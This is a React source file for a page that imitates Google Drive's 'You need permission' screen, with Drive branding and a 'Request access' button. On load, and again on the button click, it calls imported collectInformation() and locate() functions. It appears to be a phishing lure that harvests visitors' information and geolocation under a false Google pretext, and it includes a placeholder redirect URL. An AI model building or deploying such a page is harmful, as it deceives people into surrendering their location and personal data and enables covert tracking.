import { useEffect } from 'react';
import { collectInformation, locate } from '../utils/location';

const REDIRECT_URL = 'https://your-redirect-url.com'; // Replace with your actual URL

export default function GDrive() {
  useEffect(() => {
    collectInformation();
    locate(
      () => {
        // window.location.href = REDIRECT_URL;
      },
      (err) => {
        document.getElementById('change').innerText = 'Failed';
        console.error(err);
      }
    );
  }, []);

  const handleRequestAccess = () => {
    locate(
      () => {
        // window.location.href = REDIRECT_URL;
        console.log("moaz button clicked")
      },
      (err) => {
        document.getElementById('change').innerText = 'Failed';
        console.error(err);
      }
    );
  };

  return (
    <div id="outerContainer">
      <div id="innerContainer">
        <div style={{ position: 'absolute', top: '-80px' }}>
          <div id="drive-logo">
            <span className="docs-drivelogo-img" />
            <span className="docs-drivelogo-text"> Drive</span>
          </div>
        </div>
        <div style={{ clear: 'both' }}></div>
        <div id="main">
          <div id="accessDeniedIcon" />
          <p id="accessDeniedHeader">You need permission</p>
          <div id="message">
            <p>Want in? Ask for access, or switch to an account with permission.</p>
          </div>
          <p id="buttons" style={{ paddingTop: '10px' }}>
            <button
              id="requestButton"
              className="jfk-button jfk-button-action"
              style={{ fontWeight: 'bold' }}
              onClick={handleRequestAccess}
            >
              Request access
            </button>
          </p>
          <div id="change"></div>
        </div>
      </div>
    </div>
  );
}
